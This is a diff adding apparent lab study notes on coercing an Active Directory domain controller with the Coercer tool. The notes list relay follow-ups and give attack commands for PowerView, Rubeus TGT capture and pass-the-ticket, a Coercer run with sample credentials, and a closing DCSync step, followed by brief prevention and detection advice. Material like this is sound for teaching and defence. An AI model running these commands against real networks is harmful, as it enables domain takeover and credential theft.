@@ -1,0 +1,69 @@
+Description:
+
+  - Utilize the Coercer tool to exploit all known vulnerable RPC functions.
+
+  - Relay the connection to another DC and perform DCSync (if SMB signing is disabled) 
+
+  - Force the Domain controller to connect to a machine configured for Unconstrained
+  Delegation - this will cache the TGT in the memory of the UD server, which can be
+  captured/exported with tools like Rubeus and Mimikatz.
+
+  - Relay the connection to AD Certificate Services to obtain a certificate for the DC.
+  Threat agents can then use the certificate on-demand to authenticate and pretend to be
+  the DC (e.g. DCSync)
+
+  - Relay the connection to configure Resource-based kerberos delegation for the relayed
+  machine. We can then abuse the delegation to authenticate as any administrator to that machine
+
+
+Attack:
+
+  - This assumes the attacker has gained admin rights on a server configured for unconstrained
+  delegation. We will use this server to capture the TGT, while coercer will be executed from
+  Kali machine
+
+  - To ID systems configured for Uncostrained delegation, use the Get-NetComputer function from 
+  PowerView along with the -Unconstrained switch
+    
+    Get-NetComputer -Unconstrained | select samaccountname
+
+  - We will start Rubeus in an admin prompt to monitor new logons and extract TGTs
+   
+    .\Rubeus.exe monitor /interval:1
+
+  - Need to know the IP of WS001 which can be obtained using ipconfig
+
+  - Once we know, we will switch to Kali machine to execute Coercer towards DC1, while
+  we force it to connect to WS001 if coercing is successful.
+
+    Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local
+
+  - Next, check the output of Rubeus there will be a TGT for DC1
+
+  - Can use this TGT for authentication within the domain, becoming the DC
+
+  - One way of using the TGT is through Rubeus
+
+    .\Rubeus.exe ptt /ticket:XXXXX
+
+  - Then, a DCSync attack can be executed through mimikatz
+
+
+Prevention:
+
+    - Implement a third-party RPC firewall, such as zero networks, and use it to block
+    dangerous RPC functions
+
+    - Block DC and other core infrastructure servers from connecting to ports 139 and 445,
+    except to machines that are required for AD
+
+
+Detection:
+
+    - A successful coercing attack with Coercer will result inbound requests to 445 and outbound
+    connections following towards port 445
+
+
+
+
+
